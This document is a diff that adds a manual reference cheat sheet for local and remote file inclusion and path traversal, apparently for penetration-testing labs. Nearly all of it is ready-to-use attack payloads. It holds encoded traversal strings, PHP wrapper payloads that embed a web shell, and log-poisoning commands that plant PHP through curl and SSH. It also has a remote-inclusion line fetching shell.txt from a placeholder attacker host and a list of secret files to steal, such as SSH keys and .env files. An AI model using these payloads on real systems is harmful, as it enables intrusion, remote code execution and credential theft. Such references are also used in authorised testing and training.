@@ -1,0 +1,46 @@
+# LFI / RFI / path traversal — manual reference
+
+## Traversal variants (bump depth up to ~10)
+../../../../../../../../etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd          # double-encode (decoded twice)
+....//....//....//etc/passwd                 # strips "../" once -> still "../"
+..%c0%af..%c0%afetc/passwd                   # overlong UTF-8 (legacy)
+/etc/passwd                                  # absolute
+/var/www/html/config.php
+C:\windows\win.ini                           # Windows
+..\..\..\..\windows\system32\drivers\etc\hosts
+
+## PHP wrappers
+php://filter/convert.base64-encode/resource=index.php      # read source, no exec
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=/root/proof.txt
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==   # <?php system($_GET[0]);?> -> &0=id
+expect://id                                                 # if expect ext loaded
+php://input                                                 # POST body executed (needs include + POST <?php ...?>)
+zip://uploaded.zip%23shell.php                              # if you can upload a zip
+
+## php_filter_chain -> RCE from a pure base64 read (no wrappers needed)
+# generate with: python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'
+# (synacktiv/php_filter_chain_generator) then: ?page=<long php://filter chain>&0=id
+
+## Log poisoning (LFI that can include a tainted file -> RCE)
+# 1) taint a log with PHP:
+curl http://app/ -A '<?php system($_GET[0]); ?>'          # User-Agent into access.log
+ssh '<?php system($_GET[0]);?>'@TARGET                    # into /var/log/auth.log
+# 2) include it:
+?page=/var/log/apache2/access.log&0=id
+?page=/var/log/nginx/access.log&0=id
+?page=/var/log/auth.log&0=id
+?page=/proc/self/environ&0=id                             # taint via User-Agent
+?page=/proc/self/fd/0&0=id
+
+## RFI (allow_url_include=On). Host shell.txt on your box; trailing ? eats the appended ext.
+?page=http://YOUR_IP:PORT/shell.txt?
+?page=data:text/plain,<?php system($_GET[0]);?>&0=id
+
+## High-value files to read
+/etc/passwd  /etc/hosts  /etc/apache2/apache2.conf  /etc/nginx/nginx.conf
+/root/proof.txt  /home/*/local.txt  /var/www/html/.env  /var/www/html/config.php
+/proc/self/cmdline  ~/.ssh/id_rsa  /etc/mysql/my.cnf
+C:\inetpub\wwwroot\web.config  C:\Users\Administrator\Desktop\proof.txt
